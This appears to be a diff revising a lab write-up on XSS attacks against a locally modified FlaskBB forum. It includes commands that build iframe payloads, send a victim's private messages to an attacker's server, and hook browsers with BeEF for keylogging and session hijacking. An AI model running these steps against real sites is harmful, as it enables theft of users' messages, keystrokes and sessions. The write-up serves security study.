@@ -15,7 +15,7 @@ First step is to add our extra XSS "feature". We kept it simple by adding a new 
 
     localhost:8080/xss/YWxlcnQoMSkK
 
-The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules, and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[1]
+The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules[A], and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[1]
 
 Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts !
 
@@ -48,6 +48,8 @@ Step 6 : Xssless is nice because we don't even have to have a deep look into wha
 
     python2 ~/secu/xssless/xssless.py -s -p params ../burp-logs/post-topic.burp > post-topic.js
 
+You can see it here[4].
+
 Step 7 : Now you can edit the payload to replace the title or content of the post you want. 
 
     grep content post-topic.js
@@ -75,7 +77,7 @@ Of course, like any exploit, this one is dirty as heck[4]. But hey, it kind of w
     echo "<iframe src='http://localhost:8080/xss/$(cat payloads/read-private.b64)'></iframe>" > malicious-website/read-private.html
     cd malicious-website && python3 -m http.server 1337
 
-When someone visits localhost:1337/read-private.html :
+When someone (test2 in my case) visits localhost:1337/read-private.html, after a short while our malicious server receives another request :
 
     "GET /%5B%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test1%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Private%20conversation%20is%20private%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20Or%20is%20it%20%3F%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Another%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20%E2%80%9Cprivate%E2%80%9D%20conversation%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20last%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20of%20thoses%20%22%0A%20%20%7D%0A%5D HTTP/1.1" 404 -
 
@@ -103,9 +105,48 @@ When someone visits localhost:1337/read-private.html :
 IV. Steal a user's password, and beyond ! Man In the Browser.
 -------------------------------------------------------------
 
+BeEF[6] : It means Browser Exploitation Framework, blablabla
+    
+Add a beef hook to our page :
+
+    base64 -w0 add-hook.js > add-hook.b64
+
+    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/add-hook.b64)'></iframe>" > malicious-website/add-hook.html
+    cd malicious-website && python3 -m http.server 1337
+
+Start beef server, and wait for a visitor.
+
+Key logger
+    
+    Start the Man In the Browser attack to keep the target hooked when it follows links on the current domain.
+    [SREENSHOT]
+    All actions and inputs are recorded under the "logs" panel.
+    [SREENSHOT]
+    
+Interactive session hijacking
+
+        Beef > target > use as proxy
+
+    [SREENSHOT]
+
+        chromium --temp-profile --proxy-server=localhost:6789
+
+    [SREENSHOT]
+
+    Unfortunately, I couldn't manage to get it to work. The requests stay blocked somewhere between BeEF and the zombie... 
+
+
 V. Going further.
 -----------------
     xssless : worms !
+
+
+NBs
+---
+[A] But here I learnt that b64 is "a-zA-Z0-9=" AND... "/".
+    I can't figure out why, it seems so broken, but here it is : b64encode('t ?') == 'dCA/Cg=='
+    So my url pattern may be broken by b64. Doesn't happen often though.
+
 
 Refs
 ----
@@ -113,6 +154,7 @@ Refs
     [1] The following modifications have been made to flaskbb[0] :
             forum/views.py (l35-66)
                 @forum.route("/xss/<payload>")
+                def index(payload):
                 [...]
                 return( [...],
                     payload=payload)
@@ -133,4 +175,6 @@ Refs
         and didn't investigate any further...
     [2] http://portswigger.net/burp/
     [3] https://github.com/mandatoryprogrammer/xssless
-    [4] https://github.com/centime/xss-paper/blob/master/payloads/read-private.js
+    [4] https://github.com/centime/xss-paper/blob/master/payloads/post-topic.js
+    [5] https://github.com/centime/xss-paper/blob/master/payloads/read-private.js
+    [6] http://beefproject.com/
